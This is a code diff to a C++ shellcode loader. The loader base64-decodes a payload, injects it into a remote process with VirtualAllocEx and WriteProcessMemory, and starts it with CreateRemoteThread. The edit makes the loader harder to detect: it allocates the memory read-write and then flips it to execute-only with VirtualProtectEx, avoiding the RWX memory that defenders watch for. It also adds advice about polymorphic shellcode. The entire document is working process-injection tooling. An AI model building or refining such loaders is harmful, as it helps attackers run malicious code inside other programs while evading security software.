@@ -6,6 +6,7 @@
 #include "base64.h"
 #include <string>
 
+
 using std::cout;
 using std::endl;
 using std::string;
@@ -75,8 +76,7 @@ int main(int argc, char** argv)
 	}
 
 
-	// THE BASE64 STRING OF THE CODE TO EXECUTE
-	// MAKE SURE TO USE x64 
+	// IMPORTANT! BASE64 ENCODED SC GOES HERE
 	string encodedBytes = "";
 
 	// BASE64 DECODE THE STRING TO GET BYTES
@@ -161,13 +161,13 @@ void run(unsigned char* sc, size_t scLen) {
 	
 
 	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, scLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, scLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 	if (!remoteBuffer) {
-		if (DEBUG_MODE) cout << "Failed to create remote buffer in " << LAUNCH_COMMAND << endl;
+		if (DEBUG_MODE) cout << "Failed to create remote buffer in target process" << endl;
 		exit(5);
 	}
 	else {
-		if (DEBUG_MODE) cout << "Allocating space succeeded!" << endl;
+		if (DEBUG_MODE) cout << "Allocating space (readwrite) succeeded!" << endl;
 	}
 
 	// WRITE PROCESS MEMORY
@@ -179,6 +179,19 @@ void run(unsigned char* sc, size_t scLen) {
 	else {
 		if (DEBUG_MODE) cout << "Write Process Memory succeeded!" << endl;
 	}
+
+	PDWORD oldProtectOption = new DWORD();
+	*oldProtectOption = PAGE_READWRITE;
+
+	// IMPORTANT! IF YOUR SHELLCODE IS POLYMORPHIC OR OTHERWISE SELF-MODIFYING THEN YOU NEED TO SWITCH "PAGE_EXECUTE" WITH "PAGE_READWRITE"
+	success = VirtualProtectEx(processHandle, remoteBuffer, scLen, PAGE_EXECUTE, oldProtectOption);
+	if (!success) {
+		if (DEBUG_MODE) cout << "Failed to change memory protection to execute only" << endl;
+	}
+	else {
+		if (DEBUG_MODE) cout << "Successfully changed memory protection to execute only" << endl;
+	}
+
 
 	// CREATE THREAD AND EXECUTE
 	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
